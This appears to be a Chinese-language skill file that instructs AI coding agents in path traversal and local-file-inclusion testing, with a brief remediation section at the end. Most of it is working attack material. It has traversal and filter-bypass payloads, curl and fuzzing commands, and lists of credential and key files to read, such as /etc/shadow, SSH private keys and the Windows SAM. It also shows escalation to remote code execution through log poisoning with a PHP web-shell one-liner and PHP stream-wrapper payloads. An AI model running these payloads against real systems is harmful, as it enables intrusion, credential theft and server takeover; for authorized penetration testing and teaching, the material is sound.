---
name: path-traversal-testing
title: 路径遍历漏洞利用
description: 当对授权目标做 Web 渗透、需检测/利用文件路径遍历（目录遍历/LFI）以读取服务器任意文件时使用；做参数定位、payload 构造与绕过、敏感文件读取乃至 LFI 提权到 RCE 的实操并产出漏洞证据与修复建议；不适用于未授权测试或生产数据破坏。触发词：路径遍历、目录遍历、LFI、../etc/passwd、文件下载参数
domain: 安全/appsec
triggers: [路径遍历, 目录遍历, LFI, 本地文件包含, ../etc/passwd, 文件下载参数测试, php://filter 读源码, 日志投毒 RCE, directory traversal]
tags: [安全, misc, 渗透测试, Web漏洞, 路径遍历, LFI, RCE]
level: 进阶
status: stable
agents: [claude-code, codex, cursor, gemini-cli]
tools: [curl, ffuf, wfuzz, Burp Suite, OWASP ZAP]
requires: []
related: [idor-vulnerability-testing, api-fuzzing-bug-bounty, burp-suite-testing, ffuf-web-fuzzing]
combines_with: [burp-suite-testing, penetration-testing-methodology, ffuf-web-fuzzing]
license: MIT
source: sickn33/antigravity-awesome-skills
source_license: MIT
---
> 仅限授权使用：本技能只能用于已授权的安全评估、防御性验证或受控教学环境。严禁在无授权目标上测试或破坏生产数据。

## 何时使用

- 对 Web 应用做授权渗透/复测，怀疑存在文件路径遍历（目录遍历）或本地文件包含（LFI），想读取服务器上的配置、凭据、源码等任意文件。
- 应用把用户可控输入拼进文件系统 API 而缺少校验时，定位入口、构造 payload、绕过过滤、评估影响并给出修复。
- 需要把 LFI 进一步提权为远程命令执行（RCE）。

不该用：
- 无书面授权的目标，或会破坏/泄露真实敏感数据的操作（如批量下载 `/etc/shadow`、用户隐私）。
- 漏洞本质是 SSRF、XXE、上传 getshell、SQL 注入等其他类别（虽可能与本技能链式组合，但主判断应走对应技能）。

## 步骤

1. 理解成因：应用用用户输入拼接文件路径（见示例 PHP 片段）。`../` 上跳一级目录，链式拼接可逃逸到根目录读取预期目录之外的文件。影响涵盖机密性（读文件）、完整性（部分场景可写）、可用性（部分场景可删）、以及与上传/日志投毒组合后的代码执行。
2. 定位入口：扫描处理文件的参数 `?file= ?path= ?page= ?template= ?filename= ?doc= ?dir= ?include= ?src= ?download= ?view= ?load=` 等。重点功能：图片加载 `/image?filename=`、模板选择 `?template=blue.php`、文件下载 `/download?file=`、文档预览 `/view?doc=`、包含机制 `?page=about`。
3. 基础利用：先试简单相对/绝对路径读取标志文件（Linux `/etc/passwd`，Windows `win.ini`）。
4. 绕过过滤：针对一次性剥离 `../`、扩展名校验、基目录校验、黑名单，依次尝试嵌套、多重/Unicode 编码、null 字节、目录前缀等变体。
5. 选取高价值目标文件，按 Linux/Windows 分别测试（见指令）。
6. 自动化模糊测试：用 ffuf/wfuzz/Burp Intruder 加载遍历字典批量打。
7. LFI→RCE 提权：日志投毒、`/proc/self/environ`、PHP 伪协议（`php://filter`/`php://input`/`data://`/`expect://`）。
8. 输出交付：遍历入口与严重度、提取到的文件内容证据、可访问数据的影响评估、安全编码修复建议。

## 指令

漏洞代码形态（成因）：
```php
$template = "blue.php";
if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
    $template = $_COOKIE['template'];
}
include("/home/user/templates/" . $template);
```

基础 payload 与测试：
```bash
# 相对遍历（逐层加深）
../../../etc/passwd
../../../../../../etc/passwd
# Windows
..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
# URL 编码 / 双重编码
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
# 绝对路径
/etc/passwd   /proc/self/environ   C:\windows\win.ini   C:\boot.ini
# curl 验证
curl "http://target.com/image?filename=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/passwd"
```

绕过技巧：
```bash
# 一次性剥离 ../
....//....//....//etc/passwd
..././..././..././etc/passwd
# 混合 / 编码
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
# 扩展名校验（旧版 PHP null 字节 / 路径截断 / 双扩展名）
../../../etc/passwd%00.jpg
../../../etc/passwd.jpg.php
# 基目录校验（先满足前缀再逃逸）
/var/www/images/../../../etc/passwd
images/../../../etc/passwd
# 黑名单（Unicode / overlong / 反斜杠变体）
..%c0%af..%c0%af..%c0%afetc/passwd
..%5c   ..%255c   ..;/..;/..;/etc/passwd
```

高价值目标文件：
```bash
# Linux
/etc/passwd  /etc/shadow(需 root)  /etc/hosts  /etc/ssh/sshd_config
/root/.ssh/id_rsa  /home/<user>/.ssh/id_rsa
/etc/nginx/nginx.conf  /etc/apache2/apache2.conf  /var/log/apache2/access.log
/var/www/html/config.php  /var/www/html/wp-config.php  /var/www/html/.htaccess
/proc/self/environ  /proc/self/cmdline  /proc/version  /etc/mysql/my.cnf
# Windows
C:\windows\win.ini  C:\boot.ini  C:\windows\system32\config\SAM
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config  C:\xampp\apache\conf\httpd.conf  C:\xampp\phpmyadmin\config.inc.php
```

自动化模糊测试：
```bash
ffuf -u "http://target.com/image?filename=FUZZ" -w /usr/share/wordlists/traversal.txt -mc 200
ffuf -u "http://target.com/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200,500 -ac
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 "http://target.com/index.php?file=FUZZ"
wfuzz -c -z file,traversal.txt -H "Cookie: session=abc123" "http://target.com/load?path=FUZZ"
```
Burp 流程：抓含文件参数的请求 → Send to Intruder → 标记参数为 payload 位 → 加载遍历字典 → 攻击 → 按响应大小/内容筛成功项。

LFI→RCE 提权：
```bash
# 日志投毒：先污染日志，再包含
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"
# auth.log（SSH 用户名投毒）
# ssh '<?php system($_GET["cmd"]); ?>'@target.com
curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
# /proc/self/environ（User-Agent 注入）
curl -A "<?php system(\$_GET['c']); ?>" "http://target.com/page?file=/proc/self/environ&c=whoami"
# PHP 伪协议
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"   # 读源码（base64）
curl -X POST -d "<?php system('id'); ?>" "http://target.com/page?file=php://input"
curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"
curl "http://target.com/page?file=expect://id"
```

## 示例

对图片加载接口 `/image?filename=23.jpg` 的递进测试：
1. 基础：`/image?filename=../../../etc/passwd` —— 若回显用户列表即确认遍历。
2. 被过滤则换编码：`..%2F..%2F..%2Fetc%2Fpasswd`、`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`。
3. 仍被拦：`....//....//....//etc/passwd`、`..;/..;/..;/etc/passwd`。
4. 试绝对路径：`/etc/passwd`。
5. 旧版叠 null 字节：`../../../etc/passwd%00.jpg`。
6. 读源码：`php://filter/convert.base64-encode/resource=index.php`，base64 解码审计配置。
7. 若可写日志/可控伪协议，按上节升级为 RCE。

## 注意事项

- 权限边界：读不了应用用户无权访问的文件；`/etc/shadow` 等需 root；很多文件权限受限。
- 应用限制：扩展名校验、基目录校验、WAF 都可能拦截常见 payload，需逐一换编码/嵌套/大小写变体。
- 测试纪律：严格在授权范围内；避免真正读取/外泄敏感数据；记录每次成功访问作为证据。
- 排错：无响应差异 → 试编码、盲遍历、换目标文件；payload 被拦 → 换编码变体/嵌套序列/大小写；无法提权 RCE → 检查日志可写性、PHP 伪协议、文件上传、会话投毒。
- 修复建议（写进交付）：用 `basename()` 剥目录；白名单校验文件名；`realpath()` 规范化后校验仍位于基目录内（PHP `strpos($realUserPath, $realBase) === 0`，Python `os.path.realpath` + `startswith(base)`）。

```php
$base = "/var/www/files/"; $realBase = realpath($base);
$realUserPath = realpath($base . $_GET['file']);
if ($realUserPath && strpos($realUserPath, $realBase) === 0) { include($realUserPath); }
```

## 互见

- 安全/misc 下的其他 Web 漏洞利用技能（SSRF、文件上传 getshell、日志投毒类）可与本技能链式组合完成 LFI→RCE。
- 编码绕过速查：URL `%2e%2e%2f`=`../`、双重 `%252e%252e%252f`、Unicode `%c0%af`=`/`、null 字节 `%00`。

---
采编自 sickn33/antigravity-awesome-skills（MIT），原作者 zebbern。
